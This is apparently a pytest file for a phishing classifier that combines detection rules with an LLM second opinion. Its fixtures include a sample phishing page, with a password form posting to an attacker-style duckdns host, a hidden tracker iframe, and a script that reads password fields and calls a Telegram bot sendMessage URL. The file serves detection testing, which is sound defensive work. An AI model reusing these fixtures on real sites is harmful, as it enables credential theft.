"""釣魚判定（analysis/phishing.py + Node 3）。

規則層（φ 本體）的測試在 test_page_mechanisms.py；這裡測判定層多做的事：Layer 1/2 分流、
混淆加權、三層輸出（規則結果／最終判定／模型分析）、不完整觀察的處理、模型不可越權。
"""
import copy

from analysis.page_mechanisms import DECISIVE_CONFIDENCE, LAYER2_CONFIDENCE_CAP
from nodes.node3_phishing_classifier import classify_phishing_node


class _NotPhishingLLM:
    def invoke(self, prompt):
        return '{"assessment": "not_phishing", "key_indicators": [], "explanation": "fixture"}'


class _MaxLLM:
    """永遠說是釣魚 —— 用來鎖住「模型不能把正常頁推成釣魚」。"""
    def __init__(self):
        self.prompts = []

    def invoke(self, prompt):
        self.prompts.append(prompt)
        return '{"assessment": "phishing", "key_indicators": ["x"], "explanation": "fixture"}'


class _ConfidentlyBenignLLM:
    def invoke(self, prompt):
        return ('{"assessment": "not_phishing", "key_indicators": ["no credential harvesting forms"], '
                '"explanation": "fixture"}')


class _WrongTypeLLM:
    """模型常回錯型別（字串 "false"、數字）—— 一律拒收，不猜意思。"""
    def invoke(self, prompt):
        return '{"assessment": false, "key_indicators": [], "explanation": ""}'


class _DeadLLM:
    def invoke(self, prompt):
        raise RuntimeError("connection reset")


def _state(url, html, js="", obf=0.0, issues=()):
    return {"url": url, "raw_html": html, "js_scripts": [],
            "deobfuscated_js": [{"deobfuscated": js, "obfuscation_score": obf}],
            "observation_issues": list(issues), "errors": []}


PHISH_HTML = """
<html><body oncontextmenu="return false;">
<form action="https://evil-collector.duckdns.org/login.php" method="post">
  <input type="text" name="email"><input type="password" name="password">
</form>
<img src="https://www.paypal.com/images/logo.png">
<iframe src="https://tracker.example-evil.tld/x" style="display:none;visibility:hidden"></iframe>
<script>
document.getElementById('password').value;
document.querySelector('[type="password"]');
fetch('https://api.telegram.org/bot123456789:AAFvE7xxxxxxxxxxxxxxxxxxxxxxxxxxxxx/sendMessage?chat_id=1');
document.onkeydown = function(e){ if(e.keyCode === 123) return false; };
</script></body></html>
"""

LEGIT_HTML = """
<html><body>
<form action="/session" method="post">
  <input type="email" name="email" required>
  <input type="password" name="password" required minlength="8">
</form>
<img src="/static/logo.png">
<script src="https://www.googletagmanager.com/gtm.js?id=GTM-XXXX"></script>
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-XXXX"
  height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<script>
navigator.sendBeacon('/analytics');
document.querySelector('[type="password"]');
</script></body></html>
"""
LEGIT_URL = "https://app.mycompany.com/login"


def test_phishing_detected():
    """Layer 1 應該直接裁決，不需要跨過任何閾值"""
    s = classify_phishing_node(_state("https://secure-login.duckdns.org/verify", PHISH_HTML), _NotPhishingLLM())
    assert s["phishing_verdict"] == s["rule_phishing_verdict"] == "phishing"
    assert s["phishing_confidence"] == DECISIVE_CONFIDENCE, "應由 Layer 1 裁決"
    joined = " ".join(s["phishing_indicators"])
    assert "[D1]" in joined and "[D3]" in joined, joined
    assert s["phishing_basis"].startswith("layer1:")


def test_legit_not_flagged():
    s = classify_phishing_node(_state(LEGIT_URL, LEGIT_HTML), _NotPhishingLLM())
    assert s["phishing_verdict"] == "not_detected", s["phishing_confidence"]
    joined = " ".join(s["phishing_indicators"])
    assert "hidden_iframe" not in joined, "GTM noscript iframe 誤判為隱藏 iframe"
    assert "brand_asset_hotlink" not in joined, "同域資源誤判為盜連"


def test_deobfuscated_js_reaches_the_rules():
    """HTML 乾淨、webhook 只出現在去混淆後的 JS，仍須判定（漏傳 extra_js 會整批靜默漏抓）。"""
    js = ("fetch('https://api.telegram.org/bot123456789:"
          "AAFvE7xxxxxxxxxxxxxxxxxxxxxxxxxxxxx/sendMessage?chat_id=1');")
    s = classify_phishing_node(
        _state("https://x.example/login", '<form action="/a"><input type="password" name="p"></form>', js),
        _NotPhishingLLM())
    assert s["phishing_verdict"] == "phishing", s["phishing_indicators"]


def test_llm_cannot_tip_a_borderline_page():
    s = classify_phishing_node(_state(LEGIT_URL, LEGIT_HTML), _MaxLLM())
    s0 = classify_phishing_node(_state(LEGIT_URL, LEGIT_HTML), _NotPhishingLLM())
    assert s["phishing_verdict"] == "not_detected"
    assert s["phishing_confidence"] == s0["phishing_confidence"]
    assert s["phishing_rule_result"] == s0["phishing_rule_result"]
    assert s["llm_phishing_assessment"] == "phishing", "模型意見要另存，看得到它說了什麼"
    assert s["model_outputs"][0]["output"]["assessment"] == "phishing"


def test_benign_model_cannot_lower_or_raise_anything():
    st = _state(LEGIT_URL, LEGIT_HTML)
    benign = classify_phishing_node(copy.deepcopy(st), _ConfidentlyBenignLLM())
    zero = classify_phishing_node(copy.deepcopy(st), _NotPhishingLLM())
    assert benign["phishing_confidence"] == zero["phishing_confidence"]
    assert "llm_detected" not in benign["phishing_rule_result"]["indicators"]
    wrong = classify_phishing_node(copy.deepcopy(st), _WrongTypeLLM())
    assert wrong["phishing_confidence"] == zero["phishing_confidence"]
    assert wrong["model_outputs"][0]["status"] == "invalid_or_unavailable"
    assert wrong["llm_phishing_assessment"] == "unavailable"


def test_llm_failure_degrades_to_rules_only():
    """模型掛掉時退化為純規則，錯誤記進 errors 而不是靜默吞掉"""
    s = classify_phishing_node(_state(LEGIT_URL, LEGIT_HTML), _DeadLLM())
    assert s["phishing_verdict"] == "not_detected"
    assert s["llm_phishing_assessment"] == "unavailable"
    assert any("[Node3] LLM error" in e for e in s["errors"]), s["errors"]


def test_confidence_never_exceeds_layer2_cap():
    s = classify_phishing_node(_state(LEGIT_URL, LEGIT_HTML), _MaxLLM())
    assert s["phishing_confidence"] <= LAYER2_CONFIDENCE_CAP, s["phishing_confidence"]


def test_heavy_obfuscation_is_recorded():
    s = classify_phishing_node(_state(LEGIT_URL, LEGIT_HTML, js="var a=1;", obf=0.9), _NotPhishingLLM())
    assert "heavy_obfuscation" in " ".join(s["phishing_indicators"])


def test_incomplete_observation_blocks_negative_but_not_positive():
    """看到的證據就是證據；但沒看到的部分可能正是答案 —— 「未檢出」需要完整觀察。"""
    caveats = ("content_requests_blocked", "interaction_gate")
    pos = classify_phishing_node(_state("https://secure-login.duckdns.org/v", PHISH_HTML, issues=caveats), None)
    assert pos["phishing_verdict"] == "phishing" and set(caveats) <= set(pos["phishing_caveats"])
    neg = classify_phishing_node(_state(LEGIT_URL, LEGIT_HTML, issues=caveats), None)
    assert neg["rule_phishing_verdict"] == "not_detected"
    assert neg["phishing_verdict"] == "unknown" and "interaction_gate" in neg["phishing_reason"]


def test_no_document_is_unknown_and_rules_do_not_run():
    s = classify_phishing_node(_state(LEGIT_URL, "", issues=("crawl_error",)), _MaxLLM())
    assert s["phishing_verdict"] == "unknown" and s["rule_phishing_verdict"] == "not_run"
    assert s["llm_phishing_assessment"] == "not_run" and not s.get("model_outputs")


def test_model_sees_evidence_not_rule_results():
    """模型的意見要是獨立的第二意見：提示詞裡不能有規則結果或判定。"""
    model = _MaxLLM()
    classify_phishing_node(_state("https://secure-login.duckdns.org/verify", PHISH_HTML), model)
    prompt = model.prompts[0]
    for leaked in ("layer1", "rules_positive", "phishing_verdict", "decisive", "[D1]"):
        assert leaked not in prompt, leaked
    assert "visible_text_excerpt" in prompt
